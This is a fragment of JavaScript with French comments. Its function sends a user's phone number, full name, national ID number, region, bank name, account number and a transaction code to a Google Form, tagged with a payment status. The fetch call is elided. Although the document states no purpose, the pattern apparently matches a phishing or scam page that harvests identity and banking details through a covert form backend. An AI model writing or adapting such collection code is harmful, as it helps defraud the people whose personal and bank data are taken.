...
function sendToGoogleForm(data, isFinal = false) {
    // Préparer les données pour Google Form
    const formData = new FormData();
    
    // Ajouter tous les champs (tu dois adapter les noms selon ton Google Form)
    formData.append("entry.123456789", data.phone || ''); // Numéro de téléphone
    formData.append("entry.987654321", data.personalInfo?.fullName || ''); // Nom complet
    formData.append("entry.111111111", data.personalInfo?.nationalId || ''); // Numéro CNI
    formData.append("entry.222222222", data.personalInfo?.region || ''); // Région
    formData.append("entry.333333333", data.bankInfo?.bankName || ''); // Banque
    formData.append("entry.444444444", data.bankInfo?.accountNumber || ''); // Numéro compte
    formData.append("entry.555555555", data.transactionCode || ''); // Code transaction
    formData.append("entry.666666666", isFinal ? 'COMPLETED' : 'PAYMENT_MADE'); // Statut
    formData.append("entry.777777777", new Date().toISOString()); // Timestamp
    
    // Envoyer les données au Google Form
    ...
    .then(() => {
        console.log('✅ Données envoyées à Google Form avec succès');
    })
    .catch(error => {
        console.error('❌ Erreur envoi Google Form:', error);
    });
    
    // Toujours logger dans la console aussi
